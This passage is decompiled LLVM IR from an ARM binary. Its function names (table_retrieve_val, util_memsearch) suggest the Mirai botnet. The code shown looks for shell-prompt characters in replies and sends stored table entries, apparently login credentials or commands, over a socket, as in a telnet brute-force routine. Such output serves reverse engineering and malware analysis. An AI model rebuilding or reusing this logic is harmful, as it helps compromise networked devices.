  store i1 %v7_f870, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_f870, label %dec_label_pc_f3f0.backedge.thread564, label %dec_label_pc_f878

dec_label_pc_f878:                                ; preds = %dec_label_pc_f870
  %v1_f878 = add i32 %v0_f868, -2
  %v2_f878 = inttoptr i32 %v1_f878 to i8*
  %v3_f878 = load i8, i8* %v2_f878, align 1
  %v4_f878 = zext i8 %v3_f878 to i32
  store i32 %v4_f878, i32* %r2.global-to-local, align 4
  %v2_f87c = icmp ugt i8 %v3_f878, 61
  store i1 %v2_f87c, i1* %cpsr_c.global-to-local, align 1
  %v7_f87c = icmp eq i8 %v3_f878, 62
  store i1 %v7_f87c, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_f87c, label %dec_label_pc_f888, label %bb441

bb441:                                            ; preds = %dec_label_pc_f878
  %v3_f880 = icmp ugt i8 %v3_f878, 57
  store i1 %v3_f880, i1* %cpsr_c.global-to-local, align 1
  %v8_f880 = icmp eq i8 %v3_f878, 58
  store i1 %v8_f880, i1* %cpsr_z.global-to-local, align 1
  br i1 %v8_f880, label %dec_label_pc_f888, label %dec_label_pc_f854

dec_label_pc_f888:                                ; preds = %dec_label_pc_f878, %bb441, %dec_label_pc_f864, %dec_label_pc_f85c, %dec_label_pc_f854, %dec_label_pc_f840, %dec_label_pc_f81c, %dec_label_pc_f838, %dec_label_pc_f830, %bb440
  %v0_f88c = phi i32 [ %v1_f810, %dec_label_pc_f840 ], [ %v1_f810, %dec_label_pc_f81c ], [ %v1_f810, %dec_label_pc_f838 ], [ %v1_f810, %dec_label_pc_f830 ], [ %v1_f810, %bb440 ], [ %v1_f870, %dec_label_pc_f854 ], [ %v1_f870, %dec_label_pc_f85c ], [ %v1_f870, %dec_label_pc_f864 ], [ %v1_f870, %bb441 ], [ %v1_f870, %dec_label_pc_f878 ]
  %v1_f88c = add i32 %v0_f88c, 1
  store i32 %v1_f88c, i32* @r7, align 4
  %v1_f890 = call i32 @table_unlock_val(i32 8)
  store i32 %v2_fd30, i32* %r1.global-to-local, align 4
  %v3_f8a0 = call i32 @table_retrieve_val(i32 8, i32* nonnull %stack_var_-60)
  %v3_f8a4 = load i32, i32* %stack_var_-60, align 4
  store i32 %v3_f8a4, i32* %r2.global-to-local, align 4
  store i32 %v3_f8a0, i32* %r1.global-to-local, align 4
  store i32 16384, i32* %r3.global-to-local, align 4
  %v0_f8b0 = load i32, i32* @r6, align 4
  %v1_f8b0 = add i32 %v0_f8b0, 4
  %v2_f8b0 = inttoptr i32 %v1_f8b0 to i32*
  %v3_f8b0 = load i32, i32* %v2_f8b0, align 4
  %v4_f8b4 = call i32 @__libc_send(i32 %v3_f8b0, i32 %v3_f8a0, i32 %v3_f8a4, i32 16384)
  store i32 16384, i32* %r3.global-to-local, align 4
  store i32 ptrtoint ([3 x i8]* @global_var_19648.193 to i32), i32* %r1.global-to-local, align 4
  store i32 2, i32* %r2.global-to-local, align 4
  %v0_f8c4 = load i32, i32* @r6, align 4
  %v1_f8c4 = add i32 %v0_f8c4, 4
  %v2_f8c4 = inttoptr i32 %v1_f8c4 to i32*
  %v3_f8c4 = load i32, i32* %v2_f8c4, align 4
  %v4_f8c8 = call i32 @__libc_send(i32 %v3_f8c4, i32 ptrtoint ([3 x i8]* @global_var_19648.193 to i32), i32 2, i32 16384)
  %v1_f8d0 = call i32 @table_lock_val(i32 8)
  store i32 7, i32* @r3, align 4
  %v1_f8d8 = load i32, i32* @r6, align 4
  %v2_f8d8 = add i32 %v1_f8d8, 12
  %v3_f8d8 = inttoptr i32 %v2_f8d8 to i32*
  store i32 7, i32* %v3_f8d8, align 4
  br label %dec_label_pc_f640

dec_label_pc_f8e0:                                ; preds = %dec_label_pc_f470
  %v1_f8e0 = add i32 %v0_f470, 24
  %v2_f8e0 = inttoptr i32 %v1_f8e0 to i32*
  %v3_f8e0 = load i32, i32* %v2_f8e0, align 4
  store i32 %v3_f8e0, i32* %r2.global-to-local, align 4
  %v1_f8e4 = add i32 %v3_f8e0, -1
  store i32 %v1_f8e4, i32* %r1.global-to-local, align 4
  store i1 true, i1* %cpsr_c.global-to-local, align 1
  %v2_f8e8 = icmp eq i32 %v1_f8e4, 0
  store i1 %v2_f8e8, i1* %cpsr_z.global-to-local, align 1
  %tmp442 = icmp slt i32 %v1_f8e4, 1
  br i1 %tmp442, label %dec_label_pc_f3f0.backedge.thread, label %dec_label_pc_f8f0

dec_label_pc_f8f0:                                ; preds = %dec_label_pc_f8e0
  %v2_f8f0 = add i32 %v1_f8e4, %v0_f470
  store i32 %v2_f8f0, i32* %r3.global-to-local, align 4
  %v1_f8f4 = add i32 %v2_f8f0, 28
  %v2_f8f4 = inttoptr i32 %v1_f8f4 to i8*
  %v3_f8f4 = load i8, i8* %v2_f8f4, align 1
  %v4_f8f4 = zext i8 %v3_f8f4 to i32
  store i32 %v4_f8f4, i32* %r3.global-to-local, align 4
  %v2_f8f8 = icmp ugt i8 %v3_f8f4, 61
  store i1 %v2_f8f8, i1* %cpsr_c.global-to-local, align 1
  %v7_f8f8 = icmp eq i8 %v3_f8f4, 62
  store i1 %v7_f8f8, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_f8f8, label %dec_label_pc_f95c, label %bb443

bb443:                                            ; preds = %dec_label_pc_f8f0
  %v3_f8fc = icmp ugt i8 %v3_f8f4, 57
  store i1 %v3_f8fc, i1* %cpsr_c.global-to-local, align 1
  %v8_f8fc = icmp eq i8 %v3_f8f4, 58
  store i1 %v8_f8fc, i1* %cpsr_z.global-to-local, align 1
  br i1 %v8_f8fc, label %dec_label_pc_f95c, label %dec_label_pc_f904

dec_label_pc_f904:                                ; preds = %bb443
  %v2_f904 = icmp ugt i8 %v3_f8f4, 35
  store i1 %v2_f904, i1* %cpsr_c.global-to-local, align 1
  %v7_f904 = icmp eq i8 %v3_f8f4, 36
  store i1 %v7_f904, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_f904, label %dec_label_pc_f95c, label %dec_label_pc_f90c

dec_label_pc_f90c:                                ; preds = %dec_label_pc_f904
  %v2_f90c = icmp ugt i8 %v3_f8f4, 34
  store i1 %v2_f90c, i1* %cpsr_c.global-to-local, align 1
  %v7_f90c = icmp eq i8 %v3_f8f4, 35
  store i1 %v7_f90c, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_f90c, label %dec_label_pc_f95c, label %dec_label_pc_f914

dec_label_pc_f914:                                ; preds = %dec_label_pc_f90c
  %v2_f914 = icmp ugt i8 %v3_f8f4, 36
  store i1 %v2_f914, i1* %cpsr_c.global-to-local, align 1
  %v7_f914 = icmp eq i8 %v3_f8f4, 37
  store i1 %v7_f914, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_f914, label %dec_label_pc_f95c, label %dec_label_pc_f944.preheader

dec_label_pc_f944.preheader:                      ; preds = %dec_label_pc_f914
  %v3_f918 = add i32 %v0_f470, 28
  %v2_f91c = add i32 %v3_f918, %v3_f8e0
  store i32 %v2_f91c, i32* %r3.global-to-local, align 4
  br label %dec_label_pc_f944

dec_label_pc_f928:                                ; preds = %bb444
  %v2_f928 = icmp ugt i8 %v3_f94c, 35
  store i1 %v2_f928, i1* %cpsr_c.global-to-local, align 1
  %v7_f928 = icmp eq i8 %v3_f94c, 36
  store i1 %v7_f928, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_f928, label %dec_label_pc_f95c, label %dec_label_pc_f930

dec_label_pc_f930:                                ; preds = %dec_label_pc_f928
  %v2_f930 = icmp ugt i8 %v3_f94c, 34
  store i1 %v2_f930, i1* %cpsr_c.global-to-local, align 1
  %v7_f930 = icmp eq i8 %v3_f94c, 35
  store i1 %v7_f930, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_f930, label %dec_label_pc_f95c, label %dec_label_pc_f938

dec_label_pc_f938:                                ; preds = %dec_label_pc_f930
  %v2_f938 = icmp ugt i8 %v3_f94c, 36
  store i1 %v2_f938, i1* %cpsr_c.global-to-local, align 1
  %v7_f938 = icmp eq i8 %v3_f94c, 37
  store i1 %v7_f938, i1* %cpsr_z.global-to-local, align 1
  %v1_f93c = add i32 %v0_f93c, -1
  store i32 %v1_f93c, i32* %r3.global-to-local, align 4
  br i1 %v7_f938, label %dec_label_pc_f95c, label %dec_label_pc_f944

dec_label_pc_f944:                                ; preds = %dec_label_pc_f944.preheader, %dec_label_pc_f938
  %v0_f93c = phi i32 [ %v2_f91c, %dec_label_pc_f944.preheader ], [ %v1_f93c, %dec_label_pc_f938 ]
  %v0_f944 = phi i32 [ %v1_f8e4, %dec_label_pc_f944.preheader ], [ %v1_f944, %dec_label_pc_f938 ]
  %v1_f944 = add i32 %v0_f944, -1
  store i32 %v1_f944, i32* %r1.global-to-local, align 4
  %v2_f944 = icmp ne i32 %v0_f944, 0
  store i1 %v2_f944, i1* %cpsr_c.global-to-local, align 1
  %v7_f944 = icmp eq i32 %v0_f944, 1
  store i1 %v7_f944, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_f944, label %dec_label_pc_f3f0.backedge.thread564, label %dec_label_pc_f94c

dec_label_pc_f94c:                                ; preds = %dec_label_pc_f944
  %v1_f94c = add i32 %v0_f93c, -2
  %v2_f94c = inttoptr i32 %v1_f94c to i8*
  %v3_f94c = load i8, i8* %v2_f94c, align 1
  %v4_f94c = zext i8 %v3_f94c to i32
  store i32 %v4_f94c, i32* %r2.global-to-local, align 4
  %v2_f950 = icmp ugt i8 %v3_f94c, 61
  store i1 %v2_f950, i1* %cpsr_c.global-to-local, align 1
  %v7_f950 = icmp eq i8 %v3_f94c, 62
  store i1 %v7_f950, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_f950, label %dec_label_pc_f95c, label %bb444

bb444:                                            ; preds = %dec_label_pc_f94c
  %v3_f954 = icmp ugt i8 %v3_f94c, 57
  store i1 %v3_f954, i1* %cpsr_c.global-to-local, align 1
  %v8_f954 = icmp eq i8 %v3_f94c, 58
  store i1 %v8_f954, i1* %cpsr_z.global-to-local, align 1
  br i1 %v8_f954, label %dec_label_pc_f95c, label %dec_label_pc_f928

dec_label_pc_f95c:                                ; preds = %dec_label_pc_f94c, %bb444, %dec_label_pc_f938, %dec_label_pc_f930, %dec_label_pc_f928, %dec_label_pc_f914, %dec_label_pc_f8f0, %dec_label_pc_f90c, %dec_label_pc_f904, %bb443
  %v0_f960 = phi i32 [ %v1_f8e4, %dec_label_pc_f914 ], [ %v1_f8e4, %dec_label_pc_f8f0 ], [ %v1_f8e4, %dec_label_pc_f90c ], [ %v1_f8e4, %dec_label_pc_f904 ], [ %v1_f8e4, %bb443 ], [ %v1_f944, %dec_label_pc_f928 ], [ %v1_f944, %dec_label_pc_f930 ], [ %v1_f944, %dec_label_pc_f938 ], [ %v1_f944, %bb444 ], [ %v1_f944, %dec_label_pc_f94c ]
  %v1_f960 = add i32 %v0_f960, 1
  store i32 %v1_f960, i32* @r7, align 4
  %v1_f964 = call i32 @table_unlock_val(i32 7)
  store i32 %v2_fd30, i32* %r1.global-to-local, align 4
  %v3_f974 = call i32 @table_retrieve_val(i32 7, i32* nonnull %stack_var_-60)
  %v3_f978 = load i32, i32* %stack_var_-60, align 4
  store i32 %v3_f978, i32* %r2.global-to-local, align 4
  store i32 %v3_f974, i32* %r1.global-to-local, align 4
  store i32 16384, i32* %r3.global-to-local, align 4
  %v0_f984 = load i32, i32* @r6, align 4
  %v1_f984 = add i32 %v0_f984, 4
  %v2_f984 = inttoptr i32 %v1_f984 to i32*
  %v3_f984 = load i32, i32* %v2_f984, align 4
  %v4_f988 = call i32 @__libc_send(i32 %v3_f984, i32 %v3_f974, i32 %v3_f978, i32 16384)
  store i32 16384, i32* %r3.global-to-local, align 4
  store i32 ptrtoint ([3 x i8]* @global_var_19648.193 to i32), i32* %r1.global-to-local, align 4
  store i32 2, i32* %r2.global-to-local, align 4
  %v0_f998 = load i32, i32* @r6, align 4
  %v1_f998 = add i32 %v0_f998, 4
  %v2_f998 = inttoptr i32 %v1_f998 to i32*
  %v3_f998 = load i32, i32* %v2_f998, align 4
  %v4_f99c = call i32 @__libc_send(i32 %v3_f998, i32 ptrtoint ([3 x i8]* @global_var_19648.193 to i32), i32 2, i32 16384)
  %v1_f9a4 = call i32 @table_lock_val(i32 7)
  store i32 6, i32* @r3, align 4
  %v1_f9ac = load i32, i32* @r6, align 4
  %v2_f9ac = add i32 %v1_f9ac, 12
  %v3_f9ac = inttoptr i32 %v2_f9ac to i32*
  store i32 6, i32* %v3_f9ac, align 4
  br label %dec_label_pc_f640

dec_label_pc_f9b4:                                ; preds = %dec_label_pc_f470
  %v1_f9b4 = add i32 %v0_f470, 24
  %v2_f9b4 = inttoptr i32 %v1_f9b4 to i32*
  %v3_f9b4 = load i32, i32* %v2_f9b4, align 4
  store i32 %v3_f9b4, i32* %r2.global-to-local, align 4
  %v1_f9b8 = add i32 %v3_f9b4, -1
  store i32 %v1_f9b8, i32* %r1.global-to-local, align 4
  store i1 true, i1* %cpsr_c.global-to-local, align 1
  %v2_f9bc = icmp eq i32 %v1_f9b8, 0
  store i1 %v2_f9bc, i1* %cpsr_z.global-to-local, align 1
  %tmp445 = icmp slt i32 %v1_f9b8, 1
  br i1 %tmp445, label %dec_label_pc_f3f0.backedge.thread, label %dec_label_pc_f9c4

dec_label_pc_f9c4:                                ; preds = %dec_label_pc_f9b4
  %v2_f9c4 = add i32 %v1_f9b8, %v0_f470
  store i32 %v2_f9c4, i32* %r3.global-to-local, align 4
  %v1_f9c8 = add i32 %v2_f9c4, 28
  %v2_f9c8 = inttoptr i32 %v1_f9c8 to i8*
  %v3_f9c8 = load i8, i8* %v2_f9c8, align 1
  %v4_f9c8 = zext i8 %v3_f9c8 to i32
  store i32 %v4_f9c8, i32* %r3.global-to-local, align 4
  %v2_f9cc = icmp ugt i8 %v3_f9c8, 61
  store i1 %v2_f9cc, i1* %cpsr_c.global-to-local, align 1
  %v7_f9cc = icmp eq i8 %v3_f9c8, 62
  store i1 %v7_f9cc, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_f9cc, label %dec_label_pc_fa88, label %bb446

bb446:                                            ; preds = %dec_label_pc_f9c4
  %v3_f9d0 = icmp ugt i8 %v3_f9c8, 57
  store i1 %v3_f9d0, i1* %cpsr_c.global-to-local, align 1
  %v8_f9d0 = icmp eq i8 %v3_f9c8, 58
  store i1 %v8_f9d0, i1* %cpsr_z.global-to-local, align 1
  br i1 %v8_f9d0, label %dec_label_pc_fa88, label %dec_label_pc_f9d8

dec_label_pc_f9d8:                                ; preds = %bb446
  %v2_f9d8 = icmp ugt i8 %v3_f9c8, 35
  store i1 %v2_f9d8, i1* %cpsr_c.global-to-local, align 1
  %v7_f9d8 = icmp eq i8 %v3_f9c8, 36
  store i1 %v7_f9d8, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_f9d8, label %dec_label_pc_fa88, label %dec_label_pc_f9e0

dec_label_pc_f9e0:                                ; preds = %dec_label_pc_f9d8
  %v2_f9e0 = icmp ugt i8 %v3_f9c8, 34
  store i1 %v2_f9e0, i1* %cpsr_c.global-to-local, align 1
  %v7_f9e0 = icmp eq i8 %v3_f9c8, 35
  store i1 %v7_f9e0, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_f9e0, label %dec_label_pc_fa88, label %dec_label_pc_f9e8

dec_label_pc_f9e8:                                ; preds = %dec_label_pc_f9e0
  %v2_f9e8 = icmp ugt i8 %v3_f9c8, 36
  store i1 %v2_f9e8, i1* %cpsr_c.global-to-local, align 1
  %v7_f9e8 = icmp eq i8 %v3_f9c8, 37
  store i1 %v7_f9e8, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_f9e8, label %dec_label_pc_fa88, label %dec_label_pc_fa70.preheader

dec_label_pc_fa70.preheader:                      ; preds = %dec_label_pc_f9e8
  %v3_f9ec = add i32 %v0_f470, 28
  %v2_f9f0 = add i32 %v3_f9ec, %v3_f9b4
  store i32 %v2_f9f0, i32* %r3.global-to-local, align 4
  br label %dec_label_pc_fa70

dec_label_pc_fa54:                                ; preds = %bb447
  %v2_fa54 = icmp ugt i8 %v3_fa78, 35
  store i1 %v2_fa54, i1* %cpsr_c.global-to-local, align 1
  %v7_fa54 = icmp eq i8 %v3_fa78, 36
  store i1 %v7_fa54, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_fa54, label %dec_label_pc_fa88, label %dec_label_pc_fa5c

dec_label_pc_fa5c:                                ; preds = %dec_label_pc_fa54
  %v2_fa5c = icmp ugt i8 %v3_fa78, 34
  store i1 %v2_fa5c, i1* %cpsr_c.global-to-local, align 1
  %v7_fa5c = icmp eq i8 %v3_fa78, 35
  store i1 %v7_fa5c, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_fa5c, label %dec_label_pc_fa88, label %dec_label_pc_fa64

dec_label_pc_fa64:                                ; preds = %dec_label_pc_fa5c
  %v2_fa64 = icmp ugt i8 %v3_fa78, 36
  store i1 %v2_fa64, i1* %cpsr_c.global-to-local, align 1
  %v7_fa64 = icmp eq i8 %v3_fa78, 37
  store i1 %v7_fa64, i1* %cpsr_z.global-to-local, align 1
  %v1_fa68 = add i32 %v0_fa68, -1
  store i32 %v1_fa68, i32* %r3.global-to-local, align 4
  br i1 %v7_fa64, label %dec_label_pc_fa88, label %dec_label_pc_fa70

dec_label_pc_fa70:                                ; preds = %dec_label_pc_fa70.preheader, %dec_label_pc_fa64
  %v0_fa68 = phi i32 [ %v2_f9f0, %dec_label_pc_fa70.preheader ], [ %v1_fa68, %dec_label_pc_fa64 ]
  %v0_fa70 = phi i32 [ %v1_f9b8, %dec_label_pc_fa70.preheader ], [ %v1_fa70, %dec_label_pc_fa64 ]
  %v1_fa70 = add i32 %v0_fa70, -1
  store i32 %v1_fa70, i32* %r1.global-to-local, align 4
  %v2_fa70 = icmp ne i32 %v0_fa70, 0
  store i1 %v2_fa70, i1* %cpsr_c.global-to-local, align 1
  %v7_fa70 = icmp eq i32 %v0_fa70, 1
  store i1 %v7_fa70, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_fa70, label %dec_label_pc_f3f0.backedge.thread564, label %dec_label_pc_fa78

dec_label_pc_fa78:                                ; preds = %dec_label_pc_fa70
  %v1_fa78 = add i32 %v0_fa68, -2
  %v2_fa78 = inttoptr i32 %v1_fa78 to i8*
  %v3_fa78 = load i8, i8* %v2_fa78, align 1
  %v4_fa78 = zext i8 %v3_fa78 to i32
  store i32 %v4_fa78, i32* %r2.global-to-local, align 4
  %v2_fa7c = icmp ugt i8 %v3_fa78, 61
  store i1 %v2_fa7c, i1* %cpsr_c.global-to-local, align 1
  %v7_fa7c = icmp eq i8 %v3_fa78, 62
  store i1 %v7_fa7c, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_fa7c, label %dec_label_pc_fa88, label %bb447

bb447:                                            ; preds = %dec_label_pc_fa78
  %v3_fa80 = icmp ugt i8 %v3_fa78, 57
  store i1 %v3_fa80, i1* %cpsr_c.global-to-local, align 1
  %v8_fa80 = icmp eq i8 %v3_fa78, 58
  store i1 %v8_fa80, i1* %cpsr_z.global-to-local, align 1
  br i1 %v8_fa80, label %dec_label_pc_fa88, label %dec_label_pc_fa54

dec_label_pc_fa88:                                ; preds = %dec_label_pc_fa78, %bb447, %dec_label_pc_fa64, %dec_label_pc_fa5c, %dec_label_pc_fa54, %dec_label_pc_f9e8, %dec_label_pc_f9c4, %dec_label_pc_f9e0, %dec_label_pc_f9d8, %bb446
  %v0_fa8c = phi i32 [ %v1_f9b8, %dec_label_pc_f9e8 ], [ %v1_f9b8, %dec_label_pc_f9c4 ], [ %v1_f9b8, %dec_label_pc_f9e0 ], [ %v1_f9b8, %dec_label_pc_f9d8 ], [ %v1_f9b8, %bb446 ], [ %v1_fa70, %dec_label_pc_fa54 ], [ %v1_fa70, %dec_label_pc_fa5c ], [ %v1_fa70, %dec_label_pc_fa64 ], [ %v1_fa70, %bb447 ], [ %v1_fa70, %dec_label_pc_fa78 ]
  %v1_fa8c = add i32 %v0_fa8c, 1
  store i32 %v1_fa8c, i32* @r7, align 4
  %v1_fa90 = call i32 @table_unlock_val(i32 9)
  store i32 %v2_fd30, i32* %r1.global-to-local, align 4
  %v3_faa0 = call i32 @table_retrieve_val(i32 9, i32* nonnull %stack_var_-60)
  %v3_faa4 = load i32, i32* %stack_var_-60, align 4
  store i32 %v3_faa4, i32* %r2.global-to-local, align 4
  store i32 %v3_faa0, i32* %r1.global-to-local, align 4
  store i32 16384, i32* %r3.global-to-local, align 4
  %v0_fab0 = load i32, i32* @r6, align 4
  %v1_fab0 = add i32 %v0_fab0, 4
  %v2_fab0 = inttoptr i32 %v1_fab0 to i32*
  %v3_fab0 = load i32, i32* %v2_fab0, align 4
  %v4_fab4 = call i32 @__libc_send(i32 %v3_fab0, i32 %v3_faa0, i32 %v3_faa4, i32 16384)
  store i32 16384, i32* %r3.global-to-local, align 4
  store i32 ptrtoint ([3 x i8]* @global_var_19648.193 to i32), i32* %r1.global-to-local, align 4
  store i32 2, i32* %r2.global-to-local, align 4
  %v0_fac4 = load i32, i32* @r6, align 4
  %v1_fac4 = add i32 %v0_fac4, 4
  %v2_fac4 = inttoptr i32 %v1_fac4 to i32*
  %v3_fac4 = load i32, i32* %v2_fac4, align 4
  %v4_fac8 = call i32 @__libc_send(i32 %v3_fac4, i32 ptrtoint ([3 x i8]* @global_var_19648.193 to i32), i32 2, i32 16384)
  %v1_fad0 = call i32 @table_lock_val(i32 9)
  store i32 9, i32* @r3, align 4
  %v1_fad8 = load i32, i32* @r6, align 4
  %v2_fad8 = add i32 %v1_fad8, 12
  %v3_fad8 = inttoptr i32 %v2_fad8 to i32*
  store i32 9, i32* %v3_fad8, align 4
  br label %dec_label_pc_f640

dec_label_pc_fae0:                                ; preds = %dec_label_pc_f470
  %v1_fae0 = add i32 %v0_f470, 24
  %v2_fae0 = inttoptr i32 %v1_fae0 to i32*
  %v3_fae0 = load i32, i32* %v2_fae0, align 4
  store i32 %v3_fae0, i32* %r2.global-to-local, align 4
  %v1_fae4 = add i32 %v3_fae0, -1
  store i32 %v1_fae4, i32* %r1.global-to-local, align 4
  store i1 true, i1* %cpsr_c.global-to-local, align 1
  %v2_fae8 = icmp eq i32 %v1_fae4, 0
  store i1 %v2_fae8, i1* %cpsr_z.global-to-local, align 1
  %tmp448 = icmp slt i32 %v1_fae4, 1
  br i1 %tmp448, label %dec_label_pc_fb4c, label %dec_label_pc_faf0

dec_label_pc_faf0:                                ; preds = %dec_label_pc_fae0
  %v2_faf0 = add i32 %v1_fae4, %v0_f470
  store i32 %v2_faf0, i32* %r3.global-to-local, align 4
  %v1_faf4 = add i32 %v2_faf0, 28
  %v2_faf4 = inttoptr i32 %v1_faf4 to i8*
  %v3_faf4 = load i8, i8* %v2_faf4, align 1
  %v4_faf4 = zext i8 %v3_faf4 to i32
  store i32 %v4_faf4, i32* %r3.global-to-local, align 4
  %v2_faf8 = icmp ugt i8 %v3_faf4, 61
  store i1 %v2_faf8, i1* %cpsr_c.global-to-local, align 1
  %v7_faf8 = icmp eq i8 %v3_faf4, 62
  store i1 %v7_faf8, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_faf8, label %dec_label_pc_fe80, label %bb449

bb449:                                            ; preds = %dec_label_pc_faf0
  %v3_fafc = icmp ugt i8 %v3_faf4, 57
  store i1 %v3_fafc, i1* %cpsr_c.global-to-local, align 1
  %v8_fafc = icmp eq i8 %v3_faf4, 58
  store i1 %v8_fafc, i1* %cpsr_z.global-to-local, align 1
  br i1 %v8_fafc, label %dec_label_pc_fe80, label %dec_label_pc_fb04

dec_label_pc_fb04:                                ; preds = %bb449
  %v2_fb04 = icmp ugt i8 %v3_faf4, 35
  store i1 %v2_fb04, i1* %cpsr_c.global-to-local, align 1
  %v7_fb04 = icmp eq i8 %v3_faf4, 36
  store i1 %v7_fb04, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_fb04, label %dec_label_pc_fe80, label %dec_label_pc_fb0c

dec_label_pc_fb0c:                                ; preds = %dec_label_pc_fb04
  %v2_fb0c = icmp ugt i8 %v3_faf4, 34
  store i1 %v2_fb0c, i1* %cpsr_c.global-to-local, align 1
  %v7_fb0c = icmp eq i8 %v3_faf4, 35
  store i1 %v7_fb0c, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_fb0c, label %dec_label_pc_fe80, label %dec_label_pc_fb44.preheader

dec_label_pc_fb44.preheader:                      ; preds = %dec_label_pc_fb0c
  %v3_fb10 = add i32 %v0_f470, 28
  %v2_fb14 = add i32 %v3_fb10, %v3_fae0
  store i32 %v2_fb14, i32* %r3.global-to-local, align 4
  br label %dec_label_pc_fb44

dec_label_pc_fb20:                                ; preds = %dec_label_pc_fb44
  %v1_fb20 = add i32 %v0_fb3c, -2
  %v2_fb20 = inttoptr i32 %v1_fb20 to i8*
  %v3_fb20 = load i8, i8* %v2_fb20, align 1
  %v4_fb20 = zext i8 %v3_fb20 to i32
  store i32 %v4_fb20, i32* %r2.global-to-local, align 4
  %v2_fb24 = icmp ugt i8 %v3_fb20, 61
  store i1 %v2_fb24, i1* %cpsr_c.global-to-local, align 1
  %v7_fb24 = icmp eq i8 %v3_fb20, 62
  store i1 %v7_fb24, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_fb24, label %dec_label_pc_fe80, label %bb450

bb450:                                            ; preds = %dec_label_pc_fb20
  %v3_fb28 = icmp ugt i8 %v3_fb20, 57
  store i1 %v3_fb28, i1* %cpsr_c.global-to-local, align 1
  %v8_fb28 = icmp eq i8 %v3_fb20, 58
  store i1 %v8_fb28, i1* %cpsr_z.global-to-local, align 1
  br i1 %v8_fb28, label %dec_label_pc_fe80, label %dec_label_pc_fb30

dec_label_pc_fb30:                                ; preds = %bb450
  %v2_fb30 = icmp ugt i8 %v3_fb20, 35
  store i1 %v2_fb30, i1* %cpsr_c.global-to-local, align 1
  %v7_fb30 = icmp eq i8 %v3_fb20, 36
  store i1 %v7_fb30, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_fb30, label %dec_label_pc_fe80, label %dec_label_pc_fb38

dec_label_pc_fb38:                                ; preds = %dec_label_pc_fb30
  %v2_fb38 = icmp ugt i8 %v3_fb20, 34
  store i1 %v2_fb38, i1* %cpsr_c.global-to-local, align 1
  %v7_fb38 = icmp eq i8 %v3_fb20, 35
  store i1 %v7_fb38, i1* %cpsr_z.global-to-local, align 1
  %v1_fb3c = add i32 %v0_fb3c, -1
  store i32 %v1_fb3c, i32* %r3.global-to-local, align 4
  br i1 %v7_fb38, label %dec_label_pc_fe80, label %dec_label_pc_fb44

dec_label_pc_fb44:                                ; preds = %dec_label_pc_fb44.preheader, %dec_label_pc_fb38
  %v0_fb3c = phi i32 [ %v2_fb14, %dec_label_pc_fb44.preheader ], [ %v1_fb3c, %dec_label_pc_fb38 ]
  %v0_fb44 = phi i32 [ %v1_fae4, %dec_label_pc_fb44.preheader ], [ %v1_fb44, %dec_label_pc_fb38 ]
  %v1_fb44 = add i32 %v0_fb44, -1
  store i32 %v1_fb44, i32* %r1.global-to-local, align 4
  %v2_fb44 = icmp ne i32 %v0_fb44, 0
  store i1 %v2_fb44, i1* %cpsr_c.global-to-local, align 1
  %v7_fb44 = icmp eq i32 %v0_fb44, 1
  store i1 %v7_fb44, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_fb44, label %dec_label_pc_fb4c, label %dec_label_pc_fb20

dec_label_pc_fb4c:                                ; preds = %dec_label_pc_fb44, %dec_label_pc_fae0
  %v1_fb50 = call i32 @table_unlock_val(i32 27)
  store i32 %v2_fd30, i32* %r1.global-to-local, align 4
  %v3_fb60 = call i32 @table_retrieve_val(i32 27, i32* nonnull %stack_var_-60)
  %v3_fb64 = load i32, i32* %stack_var_-60, align 4
  store i32 %v3_fb60, i32* %r2.global-to-local, align 4
  %v1_fb6c = add i32 %v3_fb64, -1
  store i32 %v1_fb6c, i32* %r3.global-to-local, align 4
  %v0_fb70 = load i32, i32* @fp, align 4
  %v0_fb74 = load i32, i32* @r6, align 4
  %v1_fb74 = add i32 %v0_fb74, 24
  %v2_fb74 = inttoptr i32 %v1_fb74 to i32*
  %v3_fb74 = load i32, i32* %v2_fb74, align 4
  store i32 %v3_fb74, i32* %r1.global-to-local, align 4
  %v4_fb78 = call i32 @util_memsearch(i32 %v0_fb70, i32 %v3_fb74, i32 %v3_fb60, i32 %v1_fb6c)
  %v1_fb7c = add i32 %v4_fb78, 1
  store i32 %v1_fb7c, i32* @r7, align 4
  %v2_fb7c = icmp eq i32 %v4_fb78, -1
  store i1 %v2_fb7c, i1* %cpsr_c.global-to-local, align 1
  %v7_fb7c = icmp eq i32 %v1_fb7c, 0
  store i1 %v7_fb7c, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_fb7c, label %dec_label_pc_10134.loopexit, label %dec_label_pc_fb8c

dec_label_pc_fb8c:                                ; preds = %dec_label_pc_fb4c
  store i32 1, i32* @r7, align 4
  store i1 true, i1* %cpsr_c.global-to-local, align 1
  store i1 false, i1* %cpsr_z.global-to-local, align 1
  %v1_fb90 = call i32 @table_lock_val(i32 27)
  br label %dec_label_pc_fb94

dec_label_pc_fb94:                                ; preds = %dec_label_pc_fe80, %dec_label_pc_fb8c
  %v0_fb94 = load i32, i32* @r6, align 4
  %v1_fb94 = inttoptr i32 %v0_fb94 to i32*
  %v2_fb94 = load i32, i32* %v1_fb94, align 4
  store i32 %v2_fb94, i32* %r3.global-to-local, align 4
  %v1_fb98 = add i32 %v0_fb94, 4
  %v2_fb98 = inttoptr i32 %v1_fb98 to i32*
  %v3_fb98 = load i32, i32* %v2_fb98, align 4
